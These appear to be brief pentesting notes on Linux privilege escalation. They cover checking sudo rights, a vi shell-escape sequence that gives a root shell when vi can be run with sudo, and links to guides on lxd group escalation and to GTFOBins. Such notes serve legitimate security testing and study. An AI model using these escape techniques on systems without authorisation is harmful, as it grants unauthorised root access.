## Common

List your user's sudo priveleges with

```bash
~$ sudo -l
```

## vi

If we can sudo to use vi, we can break out of it into a shell

```bash
# within vi
:set shell=/bin/sh
:shell
```

## LXD

LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. If a user is a member of the lxd group, can escalate with https://www.hackingarticles.in/lxd-privilege-escalation/ (or, more complicated, https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)

## Links

[GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.](https://gtfobins.github.io/)